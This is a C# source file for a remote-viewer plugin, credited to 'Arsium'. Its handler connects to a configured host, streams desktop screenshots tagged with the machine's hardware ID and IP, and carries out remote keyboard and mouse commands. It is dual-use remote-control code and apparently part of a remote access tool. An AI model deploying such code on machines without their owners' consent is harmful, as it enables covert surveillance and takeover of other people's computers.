using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class ClientHandler : IDisposable
    {
        public Host host { get; set; }
        private Socket socket { get; set; }
        public bool Connected { get; set; }
        public string HWID { get; set; }
        public string baseIp { get; set; }
        public string key { get; set; }
        public bool hasToExit { get; set; }

        internal int hResol;
        internal int vResol;

        public delegate bool ConnectAsync();
        private delegate int SendDataAsync(IPacket data);


        public ConnectAsync connectAsync;
        private readonly SendDataAsync sendDataAsync;

        public delegate byte[] ReadDataAsync();
        public delegate IPacket ReadPacketAsync(byte[] BufferPacket);

        public ReadDataAsync readDataAsync;
        public ReadPacketAsync readPacketAsync;

        public delegate byte[] CaptureDesktopAsync();
        public CaptureDesktopAsync captureDesktop;

        public ClientHandler(Host host, string key, string baseIp, string HWID) : base()
        {
            this.hasToExit = false;
            this.host = host;
            this.key = key;
            this.HWID = HWID;
            this.baseIp = baseIp;
            sendDataAsync = new SendDataAsync(SendData);
            readDataAsync = new ReadDataAsync(ReceiveData);
            readPacketAsync = new ReadPacketAsync(PacketParser);
            captureDesktop = new CaptureDesktopAsync(DesktopPicture);
        }

        public void ConnectStart()
        {
            connectAsync = new ConnectAsync(Connect);
            connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
        }

        private bool Connect()
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                socket.Connect(host.host, host.port);
                return true;
            }
            catch { }
            return false;
        }
        public void EndConnect(IAsyncResult ar)
        {
            Connected = connectAsync.EndInvoke(ar);

            if (hasToExit)
            {
                return;
            }
            else if (!Connected)
            {
                ConnectStart();
            }
            else
            {
                Receive();
                CaptureDesktop();
            }
        }

        public void Receive()
        {
            if (hasToExit)
                return;
            if (Connected)
                readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
            else
                ConnectStart();
        }

        private byte[] ReceiveData()
        {
            try
            {
                int total = 0;
                int recv;
                byte[] header = new byte[5];
                socket.Poll(-1, SelectMode.SelectRead);
                recv = socket.Receive(header, 0, 5, 0);

                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
                PacketType packetType = (PacketType)header[4];

                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {
                    recv = socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;
                }

                return data;
            }
            catch (Exception)
            {
                if (Connected)
                    hasToExit = true;

                Connected = false;
                return null;
            }
        }
        public void EndDataRead(IAsyncResult ar)
        {
            byte[] data = readDataAsync.EndInvoke(ar);

            if (data != null && Connected)
                readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);
            Receive();
        }


        private IPacket PacketParser(byte[] BufferPacket)
        {
            try
            {
                return BufferPacket.DeserializePacket(this.key);
            }
            catch (Exception)
            { return null;  }
        }

        public void EndPacketRead(IAsyncResult ar)
        {
            IPacket packet = readPacketAsync.EndInvoke(ar);

            if (packet != null)
                ParsePacket(packet);
        }

        public void ParsePacket(IPacket packet)
        {
            switch (packet.PacketType)
            {
                case PacketType.RM_VIEW_ON:
                    Launch.remoteViewerBasePacket = (RemoteViewerPacket)packet;        
                    break;

                case PacketType.RM_VIEW_OFF:
                    hasToExit = true;
                    break;

                case PacketType.RM_KEYBOARD:
                    RemoteKeyboardPacket remoteKeyboardPacket = (RemoteKeyboardPacket)packet;
                    KeyboardHelper.KeyPress(remoteKeyboardPacket.keyCode, remoteKeyboardPacket.isDown);
                    break;

                case PacketType.RM_MOUSE:
                    RemoteMousePacket mousePacket = (RemoteMousePacket)packet;
                    switch (mousePacket.mouseTypeAction) 
                    {
                        case RemoteMousePacket.MouseTypeAction.LEFT_DOWN:
                            MouseHelper.MouseLeftClick(new System.Drawing.Point(mousePacket.x, mousePacket.y), true);
                            break;

                        case RemoteMousePacket.MouseTypeAction.LEFT_UP:
                            MouseHelper.MouseLeftClick(new System.Drawing.Point(mousePacket.x, mousePacket.y), false);
                            break;

                        case RemoteMousePacket.MouseTypeAction.RIGHT_DOWN:
                            MouseHelper.MouseRightClick(new System.Drawing.Point(mousePacket.x, mousePacket.y), true);
                            break;

                        case RemoteMousePacket.MouseTypeAction.RIGHT_UP:
                            MouseHelper.MouseRightClick(new System.Drawing.Point(mousePacket.x, mousePacket.y), false);
                            break;

                        case RemoteMousePacket.MouseTypeAction.MOVE_MOUSE:
                            MouseHelper.MouseMove(new System.Drawing.Point(mousePacket.x, mousePacket.y));
                            break;

                        case RemoteMousePacket.MouseTypeAction.MOVE_WHEEL_UP:
                            MouseHelper.MouseScroll(new System.Drawing.Point(mousePacket.x, mousePacket.y), false);
                            break;

                        case RemoteMousePacket.MouseTypeAction.MOVE_WHEEL_DOWN:
                            MouseHelper.MouseScroll(new System.Drawing.Point(mousePacket.x, mousePacket.y), true);
                            break;

                        case RemoteMousePacket.MouseTypeAction.MIDDLE_UP:
                            MouseHelper.MiddleMouseClick(new System.Drawing.Point(mousePacket.x, mousePacket.y), false);
                            break;

                        case RemoteMousePacket.MouseTypeAction.MIDDLE_DOWN:
                            MouseHelper.MiddleMouseClick(new System.Drawing.Point(mousePacket.x, mousePacket.y), true);
                            break;
                    }
                    break;
            }
        }

        public void SendPacket(IPacket packet)
        {
            if (Connected)
                sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
        }
        private int SendData(IPacket data)
        {
            byte[] encryptedData = data.SerializePacket(this.key);

            int total = 0;
            int size = encryptedData.Length;
            int datalft = size;
            byte[] header = new byte[5];

            byte[] temp = BitConverter.GetBytes(size);

            header[0] = temp[0];
            header[1] = temp[1];
            header[2] = temp[2];
            header[3] = temp[3];
            header[4] = (byte)data.PacketType;

            lock (socket)
            {
                try
                {
                    socket.Poll(-1, SelectMode.SelectWrite);
                    int sent = socket.Send(header);

                    if (size > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                socket.Send(chunk, 0, read, SocketFlags.None);
                            }
                        }
                    }
                    else
                    {
                        while (total < size)
                        {
                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                            total += sent;
                            datalft -= sent;
                        }
                    }
                    return size;

                }
                catch (Exception)
                {
                    Connected = false;
                    return 0;
                }
            }
        }

        private void SendDataCompleted(IAsyncResult ar)
        {
            sendDataAsync.EndInvoke(ar);
        }

        public void CaptureDesktop() 
        {
            if (!hasToExit)
                captureDesktop.BeginInvoke(new AsyncCallback(EndDesktopPicture), null);
            else
                return;
        }

        public byte[] DesktopPicture() 
        {
            return CaptureHelpers.Capture(Launch.remoteViewerBasePacket.width, Launch.remoteViewerBasePacket.height, Launch.remoteViewerBasePacket.quality, Launch.remoteViewerBasePacket.format, ref vResol, ref hResol);
        }

        public void EndDesktopPicture(IAsyncResult ar) 
        {
            ar.AsyncWaitHandle.WaitOne();
            byte[] desktopPicture = captureDesktop.EndInvoke(ar);
            ar.AsyncWaitHandle.Close();

            RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON, this.baseIp, this.HWID)
            {
                desktopPicture = desktopPicture,
                hResol = hResol,
                vResol = vResol
            };

            if (!hasToExit)
            {
                Thread.Sleep(Launch.remoteViewerBasePacket.timeMS);
                SendPacket(remoteViewerPacket);
                CaptureDesktop();
            }
            else 
            {
                Launch.clientHandler.Dispose();
                return;
            }
        }
     
        public void Dispose()
        {
            socket.Close();
            socket.Dispose();
            socket = null;
        }
    }
}
